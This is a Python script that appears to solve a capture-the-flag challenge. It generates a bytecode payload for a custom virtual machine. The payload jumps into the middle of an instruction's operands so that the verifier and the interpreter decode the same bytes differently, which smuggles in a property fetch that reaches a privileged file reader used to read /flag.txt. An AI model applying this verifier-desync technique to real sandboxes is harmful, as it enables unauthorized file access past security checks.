def _enc_k(value: int) -> list[int]:
    """Encode the VM's 2-byte little-endian integer used by k(): lo + (hi<<8)."""
    if not (0 <= value <= 0xFFFF):
        raise ValueError("k-encoded value out of range")
    return [value & 0xFF, (value >> 8) & 0xFF]


def _enc_str(s: str) -> list[int]:
    raw = s.encode("utf-8")
    if len(raw) > 0x200:
        raise ValueError("string too long")
    return [0x02, *_enc_k(len(raw)), *raw]


def generate_payload() -> str:
    # VM limits: nr must be 2..0x40 and const-count <= 0x80.
    nr = 0x40

    import os
    flag_path = os.environ.get("FLAG_PATH", "/flag.txt")

    # Constants: index 0 must be "caps" (verifier requires it),
    # index 1 is the absolute path we want to read.
    # We also need index 0x21 (33) to exist for a decoy "load const".
    consts: list[str] = ["caps", flag_path]
    while len(consts) <= 0x21:
        consts.append("x")
    if len(consts) > 0x80:
        raise ValueError("too many constants")

    blob: list[int] = []
    blob.append(nr)
    blob.append(len(consts))
    for s in consts:
        blob.extend(_enc_str(s))

    # Opcodes:
    OP_LOAD_CONST = 0x01  # a
    OP_GET_GLOBAL = 0x02  # b
    OP_GET_PROP = 0x20    # c
    OP_GET_PROP_IC = 0x21 # d
    OP_CALL = 0x30        # e
    OP_RET = 0x31         # f
    OP_NOP = 0x32         # g
    OP_JMP = 0x60         # h

    # Registers:
    R_TMP = 0x00
    R_THIS = 0x01
    R_CAPS = 0x04
    R_PATH = 0x05
    R_FUNC = 0x32  # 50

    code: list[int] = []

    # Preamble:
    # r4 = global("caps")
    # r0 = r4[3]  (caps.c, an object whose prototype chain reaches the root)
    # r5 = "/flag.txt"
    code += [OP_GET_GLOBAL, R_CAPS, 0x00]
    code += [OP_GET_PROP, R_TMP, R_CAPS, 0x03]
    code += [OP_LOAD_CONST, R_PATH, 0x01]

    # Jump into the middle of an instruction operand region.
    # The verifier only linear-scans; it doesn't validate that jump targets land on
    # instruction boundaries. The interpreter *will* execute from the raw byte target.
    pre_jump_len = len(code)
    code += [OP_JMP, 0x00, 0x00]  # patched later

    # Place a "decoy" instruction stream at offset P.
    # Verifier will parse it as valid ops, but runtime will jump into byte 2 (0x21)
    # and treat it as OP_GET_PROP_IC with key=0.
    P = 200
    if len(code) > P:
        raise ValueError("chosen payload offset too small")
    code += [OP_NOP] * (P - len(code))

    # Bytes at P:
    #   01 00 21        (verifier: load_const r0, const[33])
    #   32              (verifier: nop)
    #   01 00 00        (verifier: load_const r0, const[0])
    # Runtime starts at the 0x21 byte and executes:
    #   21 32 01 00 00  (get_prop_ic r50, r1, r0, key=0)
    code += [OP_LOAD_CONST, R_TMP, 0x21]
    code += [OP_NOP]
    code += [OP_LOAD_CONST, R_TMP, 0x00]

    # After the desync block, verifier and runtime re-align at the next byte.
    # Call the function we just fetched (absolute file reader) with "/flag.txt".
    code += [OP_CALL, R_TMP, R_FUNC, R_THIS, 0x01, R_PATH]
    code += [OP_RET, R_TMP]

    # Patch jump offset: runtime computes target = (ip_after_offset) + offset.
    ip_after_offset = pre_jump_len + 3
    target = P + 2
    offset = target - ip_after_offset
    if not (0 <= offset <= 0x3FFF):
        raise ValueError("offset out of range")
    off_lo, off_hi = _enc_k(offset)
    code[pre_jump_len + 1] = off_lo
    code[pre_jump_len + 2] = off_hi

    if len(code) > 0x4000:
        raise ValueError("code too long")

    blob.extend(code)
    return "".join(f"{b:02x}" for b in blob)


if __name__ == "__main__":
    print(generate_payload())
